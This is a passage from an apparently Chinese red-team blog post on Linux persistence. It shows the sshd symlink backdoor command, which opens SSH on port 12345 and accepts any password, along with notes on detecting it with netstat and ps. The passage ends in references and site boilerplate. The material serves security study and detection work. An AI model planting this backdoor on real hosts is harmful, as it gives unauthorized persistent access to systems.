+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -sf &#x2F;usr&#x2F;sbin&#x2F;sshd &#x2F;tmp&#x2F;su;&#x2F;tmp&#x2F;su -oport&#x3D;12345</span><br></pre></td></tr></table></figure>
+<p>命令执行后u111用户可以正常任意密码登陆，但root无法登陆，提示<code>Permission denied, please try again.</code>。<br>修改PermitRootLogin为yes后依然不行，搜了半天也搜不到解决方案，暂时放弃。</p>
+<h4 id="排查-6"><a href="#排查-6" class="headerlink" title="排查"></a>排查</h4><p>进程和端口都能发现异常: </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netstat -anplt</span><br><span class="line">ps auxf</span><br></pre></td></tr></table></figure>
+
+<h2 id="参考-2"><a href="#参考-2" class="headerlink" title="参考"></a>参考</h2><p>[1].<a target="_blank" rel="noopener" href="https://kevien.github.io/2019/02/16/linux%E5%B8%B8%E8%A7%81backdoor%E5%8F%8A%E6%8E%92%E6%9F%A5%E6%8A%80%E6%9C%AF/">linux常见backdoor及排查技术</a><br>[2].<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7338">Linux下的权限维持</a><br>[3].<a target="_blank" rel="noopener" href="https://www.freebuf.com/column/162604.html">警惕利用Linux预加载型恶意动态链接库的后门</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://mieea.github.io/posts/45846/" title="Linux单机权限维持">https://mieea.github.io/posts/45846/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/redteam/" rel="tag"># redteam</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/posts/45439/" rel="prev" title="Windows单机权限维持">
+                  <i class="fa fa-chevron-left"></i> Windows单机权限维持
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      const commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder"></span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="Symbols count total">37k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">1:33</span>
+  </span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+  
+
+
+
+
+
+
+</body>
+</html>
